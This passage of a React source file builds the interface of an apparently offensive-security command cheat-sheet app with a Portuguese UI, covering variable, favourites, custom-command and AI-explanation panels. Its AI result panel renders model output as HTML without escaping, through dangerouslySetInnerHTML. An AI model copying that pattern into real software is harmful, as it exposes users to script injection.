              <h2 style={{ fontSize: 11, fontWeight: 700, color: "#58a6ff", letterSpacing: "0.15em", textTransform: "uppercase", marginBottom: 12, display: "flex", alignItems: "center", gap: 8 }}>
                <span style={{ width: 20, height: 1, background: "#30363d", display: "inline-block" }} />
                {cat}
                <span style={{ color: "#30363d" }}>({items.length})</span>
              </h2>
              <div style={{ display: "grid", gap: 8 }}>
                {items.map(cmd => <CommandCard key={cmd.id} cmd={cmd} vars={vars} favs={favs} copied={copied} onCopy={copyCmd} onFav={toggleFav} onAI={(mode) => callAI(mode, cmd)} onDelete={cmd.id > 1000 ? deleteCustom : null} />)}
              </div>
            </section>
          ))
        ) : (
          <div style={{ display: "grid", gap: 8 }}>
            {filtered.length === 0 && <p style={{ color: "#8b949e", fontSize: 13, textAlign: "center", padding: 40 }}>Nenhum comando encontrado.</p>}
            {filtered.map(cmd => <CommandCard key={cmd.id} cmd={cmd} vars={vars} favs={favs} copied={copied} onCopy={copyCmd} onFav={toggleFav} onAI={(mode) => callAI(mode, cmd)} onDelete={cmd.id > 1000 ? deleteCustom : null} />)}
          </div>
        )}
      </main>

      {/* VARS PANEL */}
      {showVars && <>
        <div className="overlay" onClick={() => setShowVars(false)} />
        <div className="panel">
          <div style={{ padding: 20 }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 20 }}>
              <span style={{ fontFamily: "'Orbitron',monospace", fontSize: 13, color: "#00ff88" }}>VARIÁVEIS GLOBAIS</span>
              <button className="btn" onClick={() => setShowVars(false)}><Icon name="close" /></button>
            </div>
            <p style={{ fontSize: 11, color: "#8b949e", marginBottom: 16 }}>Aplicadas automaticamente em todos os comandos.</p>
            {VAR_KEYS.map(k => (
              <div key={k} style={{ marginBottom: 12 }}>
                <label style={{ fontSize: 11, color: "#58a6ff", display: "block", marginBottom: 4 }}>{`{${k}}`}</label>
                <input value={vars[k] || ""} onChange={e => setVars(p => ({ ...p, [k]: e.target.value }))}
                  placeholder={VAR_PLACEHOLDERS[k]} style={{ width: "100%", padding: "7px 10px" }} />
              </div>
            ))}
            <button className="btn" onClick={() => setVars({})}
              style={{ marginTop: 8, width: "100%", padding: "8px", border: "1px solid #30363d", borderRadius: 6, fontSize: 12, color: "#8b949e" }}>
              Limpar Tudo
            </button>
          </div>
        </div>
      </>}

      {/* FAVS PANEL */}
      {showFavs && <>
        <div className="overlay" onClick={() => setShowFavs(false)} />
        <div className="panel">
          <div style={{ padding: 20 }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 20 }}>
              <span style={{ fontFamily: "'Orbitron',monospace", fontSize: 13, color: "#f7c948" }}>FAVORITOS ({favs.size})</span>
              <div style={{ display: "flex", gap: 8 }}>
                <button className="btn" onClick={() => {
                  const data = JSON.stringify(favList, null, 2);
                  const a = document.createElement("a"); a.href = URL.createObjectURL(new Blob([data])); a.download = "favorites.json"; a.click();
                }} style={{ fontSize: 11, color: "#8b949e", display: "flex", gap: 4, alignItems: "center" }}>
                  <Icon name="export" size={12} /> Export
                </button>
                <button className="btn" onClick={() => setShowFavs(false)}><Icon name="close" /></button>
              </div>
            </div>
            {favList.length === 0 ? <p style={{ color: "#8b949e", fontSize: 13 }}>Nenhum favorito ainda.</p> : (
              <div style={{ display: "grid", gap: 8 }}>
                {favList.map(cmd => <CommandCard key={cmd.id} cmd={cmd} vars={vars} favs={favs} copied={copied} onCopy={copyCmd} onFav={toggleFav} onAI={(mode) => callAI(mode, cmd)} compact />)}
              </div>
            )}
          </div>
        </div>
      </>}

      {/* ADD PANEL */}
      {showAdd && <>
        <div className="overlay" onClick={() => setShowAdd(false)} />
        <div className="panel">
          <div style={{ padding: 20 }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 20 }}>
              <span style={{ fontFamily: "'Orbitron',monospace", fontSize: 13, color: "#00ff88" }}>NOVO COMANDO</span>
              <button className="btn" onClick={() => setShowAdd(false)}><Icon name="close" /></button>
            </div>
            {[
              { label: "Título", key: "title", type: "input", placeholder: "Ex: Nmap Quick Scan" },
              { label: "Descrição", key: "desc", type: "input", placeholder: "O que esse comando faz?" },
              { label: "Comando", key: "command", type: "textarea", placeholder: "nmap -sV {RHOST}" },
            ].map(f => (
              <div key={f.key} style={{ marginBottom: 12 }}>
                <label style={{ fontSize: 11, color: "#8b949e", display: "block", marginBottom: 4 }}>{f.label}</label>
                {f.type === "textarea"
                  ? <textarea value={newCmd[f.key]} onChange={e => setNewCmd(p => ({ ...p, [f.key]: e.target.value }))}
                      placeholder={f.placeholder} rows={3} style={{ width: "100%", padding: "7px 10px", resize: "vertical" }} />
                  : <input value={newCmd[f.key]} onChange={e => setNewCmd(p => ({ ...p, [f.key]: e.target.value }))}
                      placeholder={f.placeholder} style={{ width: "100%", padding: "7px 10px" }} />
                }
              </div>
            ))}
            <div style={{ marginBottom: 12 }}>
              <label style={{ fontSize: 11, color: "#8b949e", display: "block", marginBottom: 4 }}>Categoria</label>
              <select value={newCmd.category} onChange={e => setNewCmd(p => ({ ...p, category: e.target.value }))} style={{ width: "100%", padding: "7px 10px" }}>
                {CATEGORIES.slice(1).map(c => <option key={c}>{c}</option>)}
              </select>
            </div>
            <div style={{ marginBottom: 16 }}>
              <label style={{ fontSize: 11, color: "#8b949e", display: "block", marginBottom: 6 }}>Tags</label>
              <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
                {TAGS.map(t => (
                  <button key={t} className={`btn tag-pill ${TAG_STYLE[t]}`}
                    onClick={() => setNewCmd(p => ({ ...p, tags: p.tags.includes(t) ? p.tags.filter(x => x !== t) : [...p.tags, t] }))}
                    style={{ opacity: newCmd.tags.includes(t) ? 1 : 0.35 }}>
                    {TAG_LABEL[t]}
                  </button>
                ))}
              </div>
            </div>
            <button className="btn" onClick={addCustom}
              disabled={!newCmd.title || !newCmd.command}
              style={{ width: "100%", padding: "10px", background: newCmd.title && newCmd.command ? "rgba(0,255,136,0.15)" : "transparent", border: "1px solid #00ff88", borderRadius: 6, color: "#00ff88", fontSize: 13, fontWeight: 600, opacity: newCmd.title && newCmd.command ? 1 : 0.4 }}>
              + Salvar Comando
            </button>
          </div>
        </div>
      </>}

      {/* AI RESULT PANEL */}
      {aiPanel && <>
        <div className="overlay" onClick={() => { setAiPanel(null); setAiResult(""); }} />
        <div className="panel" style={{ width: 500 }}>
          <div style={{ padding: 20 }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <Icon name="ai" size={16} />
                <span style={{ fontFamily: "'Orbitron',monospace", fontSize: 12, color: "#bc8cff" }}>
                  {aiPanel.mode === "explain" ? "EXPLICAR" : aiPanel.mode === "suggest" ? "VARIAÇÕES" : "GERAR"}
                </span>
              </div>
              <button className="btn" onClick={() => { setAiPanel(null); setAiResult(""); }}><Icon name="close" /></button>
            </div>

            {aiPanel.command?.command && (
              <div style={{ background: "#161b22", border: "1px solid #30363d", borderRadius: 6, padding: 12, marginBottom: 16 }}>
                <span style={{ fontSize: 11, color: "#8b949e", display: "block", marginBottom: 4 }}>{aiPanel.command.title}</span>
                <code style={{ fontSize: 11, color: "#79c0ff", wordBreak: "break-all" }}>{aiPanel.command.command}</code>
              </div>
            )}

            {aiLoading ? (
              <div style={{ display: "flex", gap: 12, alignItems: "center", padding: "24px 0", color: "#8b949e", fontSize: 13 }}>
                <div className="spinner" /> Consultando IA...
              </div>
            ) : (
              <div className="ai-result" style={{ fontSize: 13, lineHeight: 1.7 }}
                dangerouslySetInnerHTML={{ __html: formatAIResult(aiResult) }} />
            )}
          </div>
        </div>
      </>}
    </div>
  );
}

// ── COMMAND CARD ──────────────────────────────────────────────────────────────
function CommandCard({ cmd, vars, favs, copied, onCopy, onFav, onAI, onDelete, compact }) {
  const resolved = applyVars(cmd.command, vars);
  const hasVars = Object.values(vars).some(v => v);
  const isFav = favs.has(cmd.id);
  const isCopied = copied === cmd.id;

  return (
    <div className="cmd-card" style={{ background: "#0a0c0f", borderRadius: 8, padding: compact ? "12px 14px" : "14px 16px" }}>
      <div style={{ display: "flex", alignItems: "flex-start", gap: 10 }}>
        <div style={{ flex: 1, minWidth: 0 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6, flexWrap: "wrap" }}>
            <span style={{ fontSize: 12, fontWeight: 600, color: "#e6edf3" }}>{cmd.title}</span>
            {cmd.tags.map(t => <span key={t} className={`tag-pill ${TAG_STYLE[t]}`}>{TAG_LABEL[t]}</span>)}
            {!compact && <span style={{ fontSize: 10, color: "#30363d", marginLeft: "auto" }}>{cmd.category}</span>}
          </div>
          {cmd.desc && <p style={{ fontSize: 11, color: "#8b949e", marginBottom: 8 }}>{cmd.desc}</p>}
          <code className={`cmd-text ${hasVars ? "resolved" : ""}`}>{resolved}</code>
        </div>

        <div style={{ display: "flex", flexDirection: "column", gap: 4, flexShrink: 0 }}>
          <button className="btn" onClick={() => onCopy(cmd.command, cmd.id)}
            style={{ padding: "5px 8px", border: "1px solid #30363d", borderRadius: 5, color: isCopied ? "#00ff88" : "#8b949e", background: isCopied ? "rgba(0,255,136,0.1)" : "transparent", display: "flex", alignItems: "center", gap: 4, fontSize: 11 }}>
            {isCopied ? <><Icon name="check" size={12} /> OK</> : <><Icon name="copy" size={12} /> Copiar</>}
          </button>
          <button className="btn" onClick={() => onFav(cmd.id)}
            style={{ padding: "5px 8px", border: "1px solid #30363d", borderRadius: 5, color: isFav ? "#f7c948" : "#8b949e", background: "transparent", fontSize: 11 }}>
            {isFav ? <Icon name="starFill" size={12} /> : <Icon name="star" size={12} />}
          </button>
          {!compact && <>
            <button className="btn" onClick={() => onAI("explain")}
              style={{ padding: "5px 8px", border: "1px solid #30363d", borderRadius: 5, color: "#bc8cff", background: "transparent", fontSize: 11 }}>
              <Icon name="ai" size={12} />
            </button>
            <button className="btn" onClick={() => onAI("suggest")}
              style={{ padding: "5px 6px", border: "1px solid #30363d", borderRadius: 5, color: "#58a6ff", background: "transparent", fontSize: 10 }}>
              ±3
            </button>
          </>}
          {onDelete && (
            <button className="btn" onClick={() => onDelete(cmd.id)}
              style={{ padding: "5px 8px", border: "1px solid #30363d", borderRadius: 5, color: "#f85149", background: "transparent", fontSize: 11 }}>
              <Icon name="trash" size={12} />
            </button>
          )}
        </div>
      </div>
    </div>
  );
}

// ── FORMAT AI RESULT ──────────────────────────────────────────────────────────
function formatAIResult(text) {
  if (!text) return "";
  return text
    .replace(/```[\w]*\n?([\s\S]*?)```/g, (_, code) => `<pre>${code.trim()}</pre>`)
    .replace(/`([^`]+)`/g, "<code>$1</code>")
    .replace(/\*\*(.+?)\*\*/g, "<strong style='color:#e6edf3'>$1</strong>")
    .replace(/### (.+)/g, "<h3>$1</h3>")
    .replace(/## (.+)/g, "<h3>$1</h3>")
    .replace(/\n\n/g, "</p><p>")
    .replace(/\n/g, "<br>")
    .replace(/^/, "<p>").replace(/$/, "</p>");
}
